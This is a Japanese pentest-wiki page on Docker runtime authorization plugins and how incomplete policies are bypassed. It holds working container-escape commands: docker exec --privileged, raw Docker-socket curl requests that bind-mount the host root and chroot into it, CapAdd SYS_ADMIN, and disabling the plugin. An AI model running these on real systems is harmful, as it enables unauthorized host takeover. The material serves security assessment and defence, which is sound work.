# ランタイム認可プラグイン

{{#include ../../../banners/hacktricks-training.md}}

## 概要

ランタイム認可プラグインは、呼び出し元が特定の daemon アクションを実行できるかどうかを決定する追加のポリシーレイヤーです。Docker が典型的な例です。デフォルトでは、Docker daemon と対話できる誰もが事実上それを広範に制御できます。認可プラグインは、認証されたユーザーと要求された API 操作を検査し、ポリシーに従って要求を許可または拒否することでそのモデルを狭めようとします。

このトピックは別ページに値します。なぜなら、攻撃者が既に Docker API にアクセスできるか、`docker` グループのユーザーを持っている場合、エクスプロイトモデルが変わるからです。そのような環境では、もはや「daemon に到達できるか？」だけでなく、「daemon が認可レイヤーで囲われているか？もし囲われているなら、そのレイヤーは未処理のエンドポイント、弱い JSON パース、またはプラグイン管理権限によってバイパスされうるか？」という問いが重要になります。

## 動作

リクエストが Docker daemon に到達すると、認可サブシステムは要求コンテキストをインストール済みの一つ以上のプラグインに渡すことができます。プラグインは認証されたユーザーの識別、リクエストの詳細、選択されたヘッダー、およびコンテンツタイプが適切な場合はリクエストまたはレスポンスボディの一部を参照できます。複数のプラグインをチェーンでき、すべてのプラグインがリクエストを許可した場合にのみアクセスが付与されます。

このモデルは強力に聞こえますが、安全性はポリシー作者が API をどれだけ完全に理解しているかに完全に依存します。`docker run --privileged` をブロックしても `docker exec` を無視する、トップレベルの `Binds` のような代替 JSON キーを見落とす、あるいはプラグイン管理を許可するプラグインは、制限がかかっているという誤った安心感を生みつつ、直接的な privilege-escalation の経路を残してしまう可能性があります。

## 一般的なプラグイン対象

ポリシーのレビューで重要な領域は次のとおりです:

- コンテナ作成のエンドポイント
- `HostConfig` のフィールド（`Binds`、`Mounts`、`Privileged`、`CapAdd`、`PidMode`、および名前空間共有オプションなど）
- `docker exec` の挙動
- プラグイン管理のエンドポイント
- 意図したポリシーモデルの外で間接的にランタイムアクションを引き起こしうる任意のエンドポイント

歴史的に、Twistlock の `authz` プラグインや教育用のシンプルなプラグインである `authobot` のような例は、それらのポリシーファイルやコードパスがエンドポイントからアクションへのマッピングが実際にどのように実装されているかを示していたため、このモデルを研究しやすくしていました。アセスメント作業における重要な教訓は、ポリシー作者は最も目に見える CLI コマンドだけでなく、API の全表面を理解しなければならないということです。

## 悪用

最初の目標は、実際に何がブロックされているかを把握することです。もし daemon がアクションを拒否するなら、エラーはしばしばプラグイン名を leaks し、使用中の制御を特定するのに役立ちます:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
より広範なエンドポイントプロファイリングが必要な場合、`docker_auth_profiler` のようなツールが役立ちます。これらは、プラグインが実際に許可する API ルートや JSON 構造を確認するという繰り返しの作業を自動化してくれます。

環境がカスタムプラグインを使用しており、APIとやり取りできる場合、どのオブジェクトフィールドが実際にフィルタされているかを列挙してください:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
これらのチェックは重要です。多くの認可の失敗は概念固有ではなくフィールド固有だからです。plugin は CLI パターンを拒否しても、同等の API 構造を完全にはブロックしないことがあります。

### 完全な例: `docker exec` がコンテナ作成後に特権を追加する

特権付きコンテナの作成をブロックし、unconfined コンテナ作成と `docker exec` を許可するポリシーでも、回避される可能性があります:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
もしデーモンが第二ステップを受け入れれば、ユーザーはポリシー作成者が制限されていると信じていたコンテナ内で特権付きの対話型プロセスを取り戻すことになる。

### 完全な例: Bind Mount Through Raw API

一部の壊れたポリシーは単一の JSON shape しか検査しない。もし root filesystem の bind mount が一貫してブロックされていなければ、ホストは依然としてマウントされ得る:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
同じ概念は `HostConfig` の下にも現れることがあります:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
影響はホストのファイルシステム全体へのエスケープです。興味深い点は、このバイパスがカーネルのバグではなく、ポリシーの適用範囲の不備に起因することです。

### 完全な例: 未チェックの Capability 属性

ポリシーが capability 関連の属性をフィルタリングし忘れると、攻撃者は危険な capability を再取得するコンテナを作成できる可能性があります:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
一度 `CAP_SYS_ADMIN` または同等の強力な capability が存在すると、[capabilities.md](protections/capabilities.md) および [privileged-containers.md](privileged-containers.md) に記載された多くの breakout techniques に到達可能になります。

### 完全な例: プラグインの無効化

プラグイン管理操作が許可されている場合、最もクリーンなバイパスは制御を完全にオフにすることかもしれません:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
これはコントロールプレーンレベルのポリシーの失敗です。認可レイヤーは存在しますが、本来制限すべきユーザーがそれを無効化する権限を保持しています。

## チェック

これらのコマンドは、ポリシーレイヤーが存在するか、またそれが完全なものか表面的なものかを判別するためのものです。
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
何が興味深いか:

- プラグイン名を含む拒否メッセージは、認可レイヤーの存在を確認し、しばしば正確な実装を明らかにする。
- 攻撃者に見えるプラグイン一覧は、無効化や再設定操作が可能かどうかを判別するのに十分なことがある。
- 明らかなCLI操作のみをブロックし、生のAPIリクエストをブロックしないポリシーは、反証されるまではバイパス可能と見なすべきである。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | デフォルトでは有効になっていない | authorization pluginが構成されていない限り、デーモンアクセスは事実上全か無かになる | 不完全なプラグインポリシー、許可リストではなくブラックリストの使用、プラグイン管理を許可、フィールドレベルの盲点 |
| Podman | 直接の等価物として一般的ではない | Podmanは通常、Dockerスタイルの認可プラグインよりもUnixのパーミッション、rootless実行、API公開の判断に依存する | root権限のPodman APIを広く公開すること、ソケット権限が緩いこと |
| containerd / CRI-O | 制御モデルが異なる | これらのランタイムは通常、Dockerのauthzプラグインではなく、ソケット権限、ノードの信頼境界、および上位レイヤのオーケストレータ制御に依存する | ソケットをワークロードにマウントすること、ノードローカルの信頼仮定が弱いこと |
| Kubernetes | API-serverおよびkubeletレイヤーでauthn/authzを使用し、Docker authzプラグインは使用しない | Cluster RBACとadmission controlsが主要なポリシーレイヤーである | 過度に広いRBAC、脆弱なadmissionポリシー、kubeletやランタイムAPIの直接公開 |
